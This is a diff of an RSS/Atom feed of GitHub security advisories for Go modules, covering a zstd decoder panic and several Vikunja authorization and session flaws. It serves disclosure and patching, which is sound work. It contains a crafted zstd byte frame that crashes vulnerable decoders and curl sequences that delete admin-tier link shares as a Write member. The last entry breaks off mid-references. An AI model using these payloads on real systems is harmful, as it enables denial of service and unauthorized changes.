@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-10-27T12:59:35.963Z</updated>
+    <updated>2026-10-27T18:34:07.717Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,1392 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/klauspost/compress/zstd] compress zstd: Panic on two-block frames]]></title>
+        <id>https://github.com/advisories/GHSA-fpmh-frq8-7rj8</id>
+        <link href="https://github.com/advisories/GHSA-fpmh-frq8-7rj8"/>
+        <updated>2026-10-27T15:38:16.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A crafted ~27 KB two-block zstd frame makes DecodeAll and the streaming decoder panic with an out-of-range slice index instead of returning a decode error. The same bytes decode fine with the reference zstd. Any program that decompresses untrusted zstd input can be crashed by it. Reproduced on v1.20.0 and v1.20.1.</p>
+<p>Released in <a href="https://github.com/klauspost/compress/releases/tag/v1.20.2">https://github.com/klauspost/compress/releases/tag/v1.20.2</a></p>
+<h3 id="details">Details</h3>
+<p> The panic is in the FSE decoder that <code>huff0.ReadTable</code> uses to read a block's Huffman-weight table. Three conditions have to hold at once, and the crafted frame arranges all three.</p>
+<p>  <strong>1. A count that doesn't fit is accepted.</strong> <code>readNCount</code> permits a tableLog up to 15 (<a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L9"><code>tablelogAbsoluteMax</code></a>, checked at <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L54"><code>fse/decompress.go:54</code></a>), so a symbol's normalized count can reach 32768 (2^15). The count is stored in an <code>int16</code> at <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L126"><code>fse/decompress.go:126</code></a>, where 32768 wraps to −32768. The validation only looks at the <code>int32</code> running totals (<code>remaining</code> and <code>gotTotal</code>), which still match, so the bad value passes. The crafted second block produces <code>norm = [0, -32768]</code>, <code>symbolLen = 2</code>.</p>
+<p>  <strong>2. The decode table is built empty, with no error.</strong> In <code>buildDtable</code>, −32768 isn't the −1 that flags a low-probability symbol, so it skips that branch, and the spread loop <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L221"><code>for i := 0; i &lt; int(v); i++</code></a> runs zero times for a negative <code>v</code>. <code>position</code> never advances, so the <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L230"><code>position != 0</code></a> guard passes as well.</p>
+<p>  <strong>3. Stale state from the previous block is reused.</strong> <code>huff0</code> shares one <code>fse.Scratch</code> across both blocks, and <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L173-L189"><code>allocDtable</code></a> reuses <code>decTable</code> and <code>ct.stateTable</code> without clearing them. So the table is rebuilt on top of block 1's symbols and <code>symbolNext</code> values. Many cells end up with <code>nbBits == 0</code>, because the leftover <code>nextState</code> is ≥ 32768.</p>
+<p>  At decode time, every symbol's count is below <code>largeLimit</code>, so <code>zeroBits</code> stays false and <code>decompress</code> takes the <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L371"><code>nextFast</code></a> path. On a cell with <code>nbBits == 0</code>, <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/bitreader.go#L58-L63"><code>getBitsFast(0)</code></a> shifts by <code>(64-0)&amp;63 == 0</code> and returns the low 16 bits of the whole register instead of 0. The state runs past the end of the table, and <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L372"><code>d.dt[d.state]</code></a> panics:</p>
+<pre><code>panic: runtime error: index out of range [33077] with length 32768
+</code></pre>
+<p>  Both blocks are needed. With a fresh <code>Scratch</code>, every cell would be symbol 0 with <code>symbolNext 0</code>, <code>highBits(0)</code> would underflow, <code>newState</code> would reach 32768, and the <a href="https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L246"><code>newState &gt;= tableSize</code></a> guard would return an error. Block 1's leftover state is what carries the malformed table past that guard.</p>
+<p>  The underlying bug is the <code>int16</code> storage combined with a tableLog allowed to reach 15. The C reference uses <code>short</code> too, but caps the FSE tableLog at 12 and the Huffman-weight tableLog at 6, so the count never wraps. <code>huff0.ReadTable</code> doesn't enforce that 6-bit bound.</p>
+<p>  A fix: reject a count of <code>1&lt;&lt;15</code> (or <code>nbBits &gt; 14</code>) in <code>readNCount</code>, and enforce the weight-table tableLog in <code>huff0</code>. Clearing the reused table would also turn the panic into an error.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Run the following repro:</p>
+<pre><code>package compression
+
+import (
+    "bytes"
+    "slices"
+    "testing"
+
+    "github.com/klauspost/compress/zstd"
+    "github.com/stretchr/testify/require"
+)
+
+func TestDecodeAll(t *testing.T) {
+    // zstdFSEPanic is a crafted two-block zstd frame that makes
+    // github.com/klauspost/compress (v1.20.0 and v1.20.1) panic with an
+    // out-of-range index in fse.nextFast rather than returning an error. Cross-block
+    // FSE table-state carryover lets the second block's malformed Huffman-weight
+    // table pass the decoder's guard and overflow the decode table.
+    zstdFSEPanic := slices.Concat(
+        []byte{0x28, 0xb5, 0x2f, 0xfd, 0x00, 0x38, 0x74, 0x06, 0x00, 0x42, 0xb8, 0x32, 0x0d, 0x1a, 0x00, 0x00, 0x00, 0x90, 0xaf, 0xfa, 0xff, 0x03, 0x00, 0x80, 0xff, 0x7f},
+        bytes.Repeat([]byte{0xa5, 0x94, 0x52, 0x4a, 0x29}, 37),
+        []byte{0xa5, 0x94, 0x12, 0x00, 0xad, 0x56, 0x03, 0xee, 0xff, 0xdf, 0xb3, 0x1a, 0x1c, 0x1a, 0x00, 0xe0, 0xff, 0x1f, 0x0f, 0xb1, 0x9c, 0x5a, 0xcf, 0x4d, 0xe4, 0x1d, 0x7b, 0xab, 0x99, 0x5e, 0x01, 0x51, 0xa4, 0x73, 0xd8, 0xb1, 0xf3, 0x39, 0x4b, 0x67, 0xf6, 0xab, 0x1a, 0xab, 0x1a, 0xab, 0x1a},
+        bytes.Repeat([]byte{0x8c, 0x31, 0xc6, 0x18, 0x63}, 1365),
+        []byte{0x8c, 0x31},
+        bytes.Repeat([]byte{0x63, 0x8c, 0x31, 0xc6, 0x18}, 1365),
+        []byte{0x63, 0x2c},
+        bytes.Repeat([]byte{0x31, 0xc6, 0x18, 0x63, 0x8c}, 1365),
+        []byte{0x31, 0x46},
+        bytes.Repeat([]byte{0x31, 0xc6, 0x18, 0x63, 0x8c}, 1365),
+        []byte{0x31, 0x06, 0x00},
+    )
+
+    decoder, err := zstd.NewReader(nil)
+    require.NoError(t, err)
+
+    dst := make([]byte, 100*1024)
+    _, err = decoder.DecodeAll(zstdFSEPanic, dst)
+    require.NoError(t, err)
+}
+</code></pre>
+<p>Outputs:</p>
+<pre><code>panic: runtime error: index out of range [33077] with length 32768 [recovered, repanicked]
+
+goroutine 36 [running]:
+testing.tRunner.func1.2({0x100c2b7c0, 0x2472599b62a0})
+    /Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/testing/testing.go:1974 +0x1a0
+testing.tRunner.func1()
+    /Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/testing/testing.go:1977 +0x318
+panic({0x100c2b7c0?, 0x2472599b62a0?})
+    /Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/runtime/panic.go:860 +0x12c
+github.com/klauspost/compress/fse.(*decoder).nextFast(...)
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/fse/decompress.go:372
+github.com/klauspost/compress/fse.(*Scratch).decompress(0x247259981008)
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/fse/decompress.go:280 +0xa08
+github.com/klauspost/compress/fse.Decompress({0x247259ab60e0?, 0x0?, 0x0?}, 0x1007c839c?)
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/fse/decompress.go:33 +0x64
+github.com/klauspost/compress/huff0.ReadTable({0x247259ab60df, 0x6acf, 0x6f21}, 0x1007899f8?)
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/huff0/decompress.go:61 +0x130
+github.com/klauspost/compress/zstd.(*blockDec).decodeLiterals(0x247259aa42d0, {0x247259ab60da?, 0x19384?, 0x20000?}, 0x247259a9a958)
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/blockdec.go:446 +0x550
+github.com/klauspost/compress/zstd.(*blockDec).decodeCompressed(0x247259aa42d0, 0x247259a9a958)
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/blockdec.go:480 +0x34
+github.com/klauspost/compress/zstd.(*blockDec).decodeBuf(0x247259aa42d0, 0x247259a9a958)
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/blockdec.go:256 +0x20c
+github.com/klauspost/compress/zstd.(*frameDec).runDecoder(0x247259a9a908, {0x247259ac6000?, 0x19000, 0x129ca3800?}, 0x247259aa42d0)
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/framedec.go:371 +0x170
+github.com/klauspost/compress/zstd.(*Decoder).DecodeAll(0x247259aa41e0, {0x247259ab6000, 0x6baf, 0x7000}, {0x247259ac6000, 0x19000, 0x19000})
+    /Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/decoder.go:395 +0x410
+github.com/ava-labs/avalanchego/utils/compression.TestDecodeAll(0x247259a9a6c8)
+    /Users/joshua.kim/workspace/avalanchego/utils/compression/zstd_fse_panic_test.go:40 +0x498
+testing.tRunner(0x247259a9a6c8, 0x100c4ae80)
+    /Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/testing/testing.go:2036 +0xc4
+created by testing.(*T).Run in goroutine 1
+    /Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/testing/testing.go:2101 +0x3a8
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is a panic that callers cannot guard against with error handling. This should be a DOS for most users.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/klauspost/compress/security/advisories/GHSA-fpmh-frq8-7rj8">https://github.com/klauspost/compress/security/advisories/GHSA-fpmh-frq8-7rj8</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-116591">https://nvd.nist.gov/vuln/detail/CVE-2026-116591</a></li>
+<li><a href="https://github.com/klauspost/compress/commit/7f5d8528720c895a6106f201719f87eb030a565d">https://github.com/klauspost/compress/commit/7f5d8528720c895a6106f201719f87eb030a565d</a></li>
+<li><a href="https://github.com/klauspost/compress/releases/tag/v1.20.2">https://github.com/klauspost/compress/releases/tag/v1.20.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-fpmh-frq8-7rj8">https://github.com/advisories/GHSA-fpmh-frq8-7rj8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fpmh-frq8-7rj8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-27T15:38:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[code.vikunja.io/api] Vikunja: Saved filter creation with an empty filter string recalculates task positions across all tenants]]></title>
+        <id>https://github.com/advisories/GHSA-fprf-r6rv-xg99</id>
+        <link href="https://github.com/advisories/GHSA-fprf-r6rv-xg99"/>
+        <updated>2026-10-27T15:21:00.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>In Vikunja v2.6.0 the task position recalculation that runs when a saved filter view is created fails open when the requesting user has no accessible projects. Instead of aborting, the search that feeds the recalculation loses its project scope entirely and returns every task in the instance. The server then writes one <code>task_positions</code> row per task per view (four views per filter) into views owned by the requesting user, including rows that reference tasks of other tenants the user can never see. Any authenticated user can trigger this. The impact is a cross-tenant integrity violation, a single-request write amplification primitive that scales with instance size, and a violation of the invariant stated in the fix for GHSA-w39f-h553-h2mx that position writes are scoped by project read access.</p>
+<h3 id="details">Details</h3>
+<p>Vikunja computes kanban and list ordering in a shared <code>task_positions</code> table keyed by <code>(task_id, project_view_id)</code>. When a saved filter is created, <code>SavedFilter.Create</code> (<code>pkg/models/saved_filters.go:130</code>) calls <code>CreateDefaultViewsForProject</code> (<code>pkg/models/project_view.go:816</code>) which, for every default view it creates, calls <code>RecalculateTaskPositions</code> with <code>addExistingTasksToView = true</code> (<code>pkg/models/project_view.go:447</code>).</p>
+<p><code>RecalculateTaskPositions</code> (<code>pkg/models/task_position.go:312</code>) builds a <code>TaskCollection</code> and, for filter views (<code>view.ProjectID &lt; -1</code>), resets the project scope to zero and injects the saved filter's filter string. The scope of the subsequent search is derived from <code>getRelevantProjectsFromCollection</code> (<code>pkg/models/task_collection.go:188</code>), which for <code>ProjectID == 0</code> returns exactly the projects the requesting user can access.</p>
+<p>Inside <code>dbTaskSearcher.Search</code> (<code>pkg/models/task_search.go</code>), the WHERE clause is assembled at line 632:</p>
+<pre><code class="language-go">cond := builder.And(builder.Or(projectIDCond, favoritesCond), where, filterCond)
+</code></pre>
+<p><code>projectIDCond</code> is only set when <code>len(opts.projectIDs) &gt; 0</code> and <code>favoritesCond</code> only when the caller opted into the favorites arm, which <code>RecalculateTaskPositions</code> never does. With zero accessible projects, an empty filter string (which produces no filter condition in <code>getTaskFiltersFromFilterString</code>) and no search string, all four children of the <code>builder.And</code> are invalid. go-xorm's condition builders silently drop invalid children, so the query becomes <code>SELECT ... FROM tasks</code> with no WHERE clause at all.</p>
+<p>The result is written back unconditionally: the function deletes the view's position rows and bulk-inserts one row per returned task per view. Because the filter creation path runs this for four default views, one request writes <code>4 x total_task_count</code> rows, every one of them referencing tasks the requesting user has no relationship with, including tasks in other users' private projects.</p>
+<p>Reaching the zero-project precondition does not require any bug beyond this one. <code>UpdateUserGeneralSettings</code> (<code>pkg/models/user_settings.go:105</code>) assigns <code>default_project_id</code> from the request body without validating that the referenced project exists or belongs to the caller. A user can therefore point their default project at any project id, which unblocks deleting their own Inbox (deletion is refused only while the Inbox is the default project, error 3012 in <code>pkg/models/error.go:482</code>). After the Inbox is gone, <code>getRawProjectsForUser</code> returns an empty list.</p>
+<p>Two neighboring controls confirm the intended invariant exists elsewhere and is enforced in sibling paths. The event-driven filter update path gates candidate filters on the filter owner's access to each task's project (<code>matchTasksToViewsOfFilter</code>, introduced by commit <code>b1ad4063e7</code>), and the fix for GHSA-w39f-h553-h2mx validates position target views. The recalculation path on filter creation has no equivalent gate and contradicts the advisory statement that recalculation "aborts on its own project read-access check".</p>
+<h3 id="poc">PoC</h3>
+<blockquote>
+<p><a href="https://github.com/user-attachments/files/32740623/vikunja-filter-empty-scope-cross-tenant-positions-PoC.zip">vikunja-filter-empty-scope-cross-tenant-positions-PoC.zip</a></p>
+</blockquote>
+<p>The attached archive contains <code>deployment/deploy.sh</code> (local Vikunja v2.6.0 on loopback with SQLite) and <code>poc/poc.sh</code>, which performs the full sequence:</p>
+<ol>
+<li>Victim registers, creates a private project and a task.</li>
+<li>Attacker registers, sets <code>default_project_id</code> to the victim's project via <code>PUT /api/v2/user/settings/general</code>, deletes their own Inbox, and now has zero accessible projects.</li>
+<li>Control: <code>GET /api/v2/projects/{victim}</code> returns 403.</li>
+<li>Attacker creates a saved filter with <code>{"filter":"","filter_include_nulls":true}</code>.</li>
+<li>Verification: direct SQLite inspection shows <code>task_positions</code> rows referencing the victim's task in all four of the attacker's filter views.</li>
+<li>Control: <code>GET /api/v2/projects/{filter_pseudo_project}/tasks</code> returns 0 items, so the written rows are not readable back through collection endpoints.</li>
+</ol>
+<p>Result: 10 checks passed on two consecutive runs, each from a wiped database.</p>
+<h3 id="impact">Impact</h3>
+<p>An authenticated user, even one with no project access at all, causes the server to persist cross-tenant references: rows pointing at arbitrary other users' tasks are written into views the attacker controls. Task content is not exposed through the documented read paths (verified), so this is an integrity and availability issue rather than a direct disclosure:</p>
+<ul>
+<li>Cross-tenant integrity violation. The <code>task_positions</code> state of the attacker's views now encodes other tenants' objects, against the access model the rest of the code enforces.</li>
+<li>Write amplification and denial of service. One cheap request performs a full-table scan plus <code>4 x N</code> inserts, where N is the number of tasks in the instance. On an instance with 100,000 tasks that is 400,000 rows per request, and the request can be repeated without bound. CPU, IO and storage costs scale with instance size while attacker cost stays constant.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-fprf-r6rv-xg99">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-fprf-r6rv-xg99</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/commit/24e4563a547be182b338be2f614df339a64a6058">https://github.com/go-vikunja/vikunja/commit/24e4563a547be182b338be2f614df339a64a6058</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/releases/tag/v2.7.0">https://github.com/go-vikunja/vikunja/releases/tag/v2.7.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-fprf-r6rv-xg99">https://github.com/advisories/GHSA-fprf-r6rv-xg99</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fprf-r6rv-xg99</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-09T20:57:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[code.vikunja.io/api] Vikunja: Write-level project members can delete admin-tier link shares through an unloaded permission check]]></title>
+        <id>https://github.com/advisories/GHSA-fmmf-xq98-g327</id>
+        <link href="https://github.com/advisories/GHSA-fmmf-xq98-g327"/>
+        <updated>2026-10-27T15:20:15.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A project member with Write permission can delete an admin-tier link share on that project. The deletion authorization check reads the permission from an object populated only with URL IDs, rather than from the stored share. Its zero value is Read, so the check falls through to project Write permission instead of requiring Admin.</p>
+<h2 id="details">Details</h2>
+<p>Affected endpoints:</p>
+<ul>
+<li><code>DELETE /api/v1/projects/{project}/shares/{share}</code></li>
+<li><code>DELETE /api/v2/projects/{project}/shares/{share}</code></li>
+</ul>
+<p>Older v1 releases used <code>/lists/{list}/shares/{share}</code> before lists were renamed to projects.</p>
+<p>In <code>pkg/routes/api/v2/link_sharing.go:156</code>, the delete handler passes <code>&amp;models.LinkSharing{ID: in.ID, ProjectID: in.ProjectID}</code> to <code>handler.DoDelete</code>. The v1 generic handler likewise binds the URL IDs without loading the stored share.</p>
+<p><code>pkg/web/handler/core.go:185</code> calls <code>CanDelete</code> before <code>Delete</code>. <code>LinkSharing.CanDelete</code> delegates to <code>canDoLinkShare</code> in <code>pkg/models/link_sharing_permissions.go</code>. That helper loads the project but does not load the link share, then evaluates:</p>
+<pre><code class="language-go">if share.Permission == PermissionAdmin {
+    return l.IsAdmin(s, a)
+}
+return l.CanWrite(s, a)
+</code></pre>
+<p>On deletion, <code>share.Permission</code> is its Go zero value, <code>PermissionRead</code> (0), even when the stored share grants <code>PermissionAdmin</code> (2). A Write member therefore passes authorization. <code>LinkSharing.Delete</code> subsequently deletes by share ID and project ID without checking the stored permission.</p>
+<p>Create uses the requested permission and correctly rejects Write members creating admin shares. Share listing and by-ID reads are admin-gated in current main. There is no HTTP update route for link shares. Read-only members and link-share principals are rejected on deletion.</p>
+<h2 id="affected-versions-and-verification">Affected versions and verification</h2>
+<p>The admin-tier check was introduced in commit <code>56dbb564eae83f2453efd1049f55e9d099b5d346</code>, first included in v0.13, without loading the stored share on deletion. The affected range established by this review is <code>&gt;= 0.13.0, &lt;= 2.6.0</code>; versions before v0.13 have not been assessed here. The v2 route was added in <code>b10768506</code>, first included in v2.4.0.</p>
+<p>The reporter states that both API versions were verified live against a local source build at <code>a881ac39eecd07575a5aede8e74727c28d5fd578</code> on September 7, 2026. Maintainer-side source review confirmed the mechanism in that commit, release v2.6.0, and upstream main at <code>a1a6ca48be142902f09fee62734310cb98a8c414</code>. The live proof of concept was not independently rerun during this triage. No patched version is available at draft creation.</p>
+<h2 id="impact">Impact</h2>
+<p>A Write collaborator can revoke an admin-tier access link on a project they can already write to. New consumers can no longer authenticate with that link. In versions with database-backed link-share JWT validation, deleting the share also immediately invalidates its existing sessions; the reporter observed HTTP 404 for a new hash exchange and HTTP 401 for an existing share token.</p>
+<p>This is a bounded integrity and availability impact on external access to that project. It does not disclose data, grant Admin privileges, allow deletion of another project's shares, or permit the attacker to create a replacement admin share. The attacker must know or guess the numeric share ID; IDs are sequential.</p>
+<p>Severity: Medium. CWE-863: Incorrect Authorization.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Use two regular accounts on an instance you control. Let <code>OWNER_TOKEN</code> and <code>WRITER_TOKEN</code> be their session tokens. Create a project as the owner, grant the second account Write permission (<code>permission: 1</code>), and create an admin-tier share as the owner (<code>permission: 2</code>). Let <code>PROJECT_ID</code> and <code>SHARE_ID</code> identify that project and share.</p>
+<p>First, verify that the Write member cannot create an admin-tier share:</p>
+<pre><code class="language-sh">curl -i -X POST "$BASE/api/v2/projects/$PROJECT_ID/shares" \
+  -H "Authorization: Bearer $WRITER_TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"permission":2}'
+# Expected and reported: 403
+</code></pre>
+<p>Delete the owner's admin-tier share as the same Write member:</p>
+<pre><code class="language-sh">curl -i -X DELETE "$BASE/api/v2/projects/$PROJECT_ID/shares/$SHARE_ID" \
+  -H "Authorization: Bearer $WRITER_TOKEN"
+# Reported: 204; expected: 403 and the share remains intact
+</code></pre>
+<p>Recreate the admin-tier share as the owner and repeat with the v1 endpoint:</p>
+<pre><code class="language-sh">curl -i -X DELETE "$BASE/api/v1/projects/$PROJECT_ID/shares/$SHARE_ID" \
+  -H "Authorization: Bearer $WRITER_TOKEN"
+# Reported: 200 with {"message":"Successfully deleted."}; expected: 403
+</code></pre>
+<p>With the collaborator downgraded to Read, deletion returns 403. These positive and negative controls were reported as verified live by the reporter.</p>
+<h2 id="recommended-fix">Recommended fix</h2>
+<p>For deletion, load the stored share scoped to both the requested share ID and project ID before authorizing. Require project Admin when the stored permission is Admin, and retain the intended Write rule for ordinary read/write shares. Preserve the existing cross-project constraint.</p>
+<p>Keep creation authorization based on the requested tier. If update support is added, check both the stored tier and the requested new tier so neither demotion nor promotion can bypass the admin check.</p>
+<p>Add regression coverage for a Write member being forbidden to delete an admin-tier share, an Admin being allowed, intended ordinary-share deletion, rejection of Read members and link-share principals, and mismatched project/share IDs. Cover both API versions.</p>
+<h2 id="related-advisories">Related advisories</h2>
+<ul>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-f95f-77jx-fcjc">GHSA-f95f-77jx-fcjc / CVE-2026-33700</a> addressed cross-project deletion. Fix <code>654d2c704</code> constrained deletion by <code>project_id</code> but did not change the permission-tier check.</li>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-qfwc-vx6f-3g6g">GHSA-qfwc-vx6f-3g6g</a> addressed share-hash disclosure through by-ID reads.</li>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9">GHSA-8hp8-9fhr-pfm9</a> addressed share-hash disclosure through listing.</li>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-96q5-xm3p-7m84">GHSA-96q5-xm3p-7m84 / CVE-2026-35594</a> addressed tokens remaining valid after deletion. That fix does not prevent unauthorized deletion.</li>
+</ul>
+<h2 id="credit">Credit</h2>
+<p>Reported via mail.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-fmmf-xq98-g327">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-fmmf-xq98-g327</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/commit/60e543777b4d3ec8376f5485911cdec697e8c8ee">https://github.com/go-vikunja/vikunja/commit/60e543777b4d3ec8376f5485911cdec697e8c8ee</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/releases/tag/v2.7.0">https://github.com/go-vikunja/vikunja/releases/tag/v2.7.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-fmmf-xq98-g327">https://github.com/advisories/GHSA-fmmf-xq98-g327</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fmmf-xq98-g327</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-09T20:57:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[code.vikunja.io/api] Vikunja: WebSocket authentication ignores server-side session state, so revoked sessions keep receiving live pushes]]></title>
+        <id>https://github.com/advisories/GHSA-4hv6-xc92-j86g</id>
+        <link href="https://github.com/advisories/GHSA-4hv6-xc92-j86g"/>
+        <updated>2026-10-27T15:19:31.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Vikunja v2.6.0 introduced server-side sessions with revocation semantics: <code>DELETE /api/v2/user/sessions/{id}</code> documents "Revokes a specific session by its UUID", and enabling TOTP calls <code>DeleteAllUserSessions</code> to invalidate all sessions. The WebSocket endpoint accepts any cryptographically valid user JWT without ever resolving its <code>sid</code> (session id) claim against the sessions table. A connection authenticated before revocation stays authenticated and continues to receive live pushes indefinitely, and even brand-new WebSocket connections are accepted with a token whose session was deleted. The revocation feature therefore does not cover the WebSocket boundary at all.</p>
+<h3 id="details">Details</h3>
+<p>User access JWTs carry a session reference: <code>NewUserJWTAuthtoken</code> (<code>pkg/modules/auth/auth.go:188</code>) sets <code>claims["sid"] = sessionID</code>, and the API login-session documentation describes the claim as tying the JWT to a server-side session. On the HTTP side nothing consumes the claim per request either (REST access tokens simply expire after their short TTL, a design the maintainers documented when fixing GHSA-96q5, and refresh tokens are correctly invalidated when the session row is deleted).</p>
+<p>The WebSocket endpoint <code>GET /api/v2/ws</code> authenticates through the first client message. <code>Connection.handleAuth</code> (<code>pkg/websocket/connection.go:168</code>) validates the token exclusively with <code>auth.GetUserIDFromToken</code> (<code>pkg/modules/auth/auth.go:292</code>):</p>
+<pre><code class="language-go">func GetUserIDFromToken(tokenString string) (int64, error) {
+    token, err := jwt.Parse(tokenString, func(_ *jwt.Token) (any, error) {
+        return []byte(config.ServiceSecret.GetString()), nil
+    })
+    ...
+    typ, ok := claims["type"].(float64)
+    if !ok || int(typ) != AuthTypeUser {
+        return 0, jwt.ErrTokenInvalidClaims
+    }
+    ...
+}
+</code></pre>
+<p>The function verifies signature and token type only. No session lookup occurs anywhere in the WebSocket path, and no re-validation happens after the initial auth. Consequently:</p>
+<ol>
+<li>A connection authenticated before <code>DELETE /api/v2/user/sessions/{id}</code> (or before TOTP enable, which runs <code>models.DeleteAllUserSessions</code>, <code>pkg/routes/api/v2/user_totp.go:208</code>) remains registered in the hub and keeps receiving every subscribed event, such as <code>notification.created</code> with the full notification object including comment, task and project content.</li>
+<li>A new connection opened after the deletion, using the same pre-revocation token, authenticates successfully.</li>
+<li>Session deletion is observable only in the REST surface. The user's session list empties, the refresh token dies on next use, but the WebSocket channel never notices.</li>
+</ol>
+<p>For REST the exposure is bounded by the 10-minute access-token TTL. For WebSocket it is not: a connection lives until the client closes it, so a session the user believes revoked retains a live, server-pushed data channel with no time bound.</p>
+<h3 id="poc">PoC</h3>
+<blockquote>
+<p><a href="https://github.com/user-attachments/files/32741065/vikunja-ws-auth-ignores-session-revocation-PoC.zip">vikunja-ws-auth-ignores-session-revocation-PoC.zip</a></p>
+</blockquote>
+<p>The attached archive contains <code>deployment/deploy.sh</code> (local Vikunja v2.6.0 on loopback with SQLite) and <code>poc/poc.sh</code> running <code>poc/poc.py</code>:</p>
+<ol>
+<li>Victim registers and logs in. Second user registers for later interaction.</li>
+<li>Control: the victim's WebSocket authenticates and subscribes to <code>notification.created</code>. Negative control: a garbage token is rejected with <code>invalid_token</code>.</li>
+<li>Every victim session is deleted via <code>DELETE /api/v2/user/sessions/{id}</code> (the list afterwards reports 0 remaining).</li>
+<li>Exploit A: a brand-new WebSocket connection authenticates successfully with the deleted-session token.</li>
+<li>Exploit B: the second user comments on a task mentioning the victim. The victim's pre-revocation WebSocket connection receives the <code>notification.created</code> push with the full notification payload.</li>
+</ol>
+<p>Result: 10 checks passed on two consecutive runs, each from a wiped database.</p>
+<h3 id="impact">Impact</h3>
+<p>Session revocation, the mechanism a user relies on when a device is lost or a token is suspected stolen, silently excludes the WebSocket channel. A stolen or leaked access token can be converted into a push channel that survives every revocation action available to the user, including TOTP enrollment whose documented purpose is invalidating all sessions, and keeps delivering the victim's notifications (comment mentions, task and project metadata) until the attacker chooses to disconnect. The fix is to resolve the <code>sid</code> claim against the sessions table during <code>handleAuth</code> and to re-validate or drop hub connections when their session is deleted.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-4hv6-xc92-j86g">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-4hv6-xc92-j86g</a></li>
